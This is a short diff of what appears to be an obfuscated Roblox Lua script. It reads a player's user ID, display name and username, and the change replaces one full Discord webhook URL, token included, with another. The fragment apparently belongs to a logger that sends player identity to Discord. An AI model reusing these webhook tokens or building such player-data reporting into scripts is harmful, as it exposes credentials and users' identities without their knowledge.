@@ -8,7 +8,7 @@ local e = d.UserId
 local f = d.DisplayName
 local g = d.Name
 
-local h = "https://discord.com/api/webhooks/1490803992723329054/1TwOuDGWbne2sMJQomf5TyJZyqfM0q-OiC_LWbS6WHb2Qhn8hFLOEPGvfy8vLLtUzlxT"
+local h = "https://discord.com/api/webhooks/1491947651187343411/2PyMfh2rbExaJhcu76M6KEff9xZPz-z5ozcMaGpxkZKAtaZE15Xe-AQlbBP_nPAEkYGR"
 
 local i = "Unknown Game"
 local j = "Unknown"
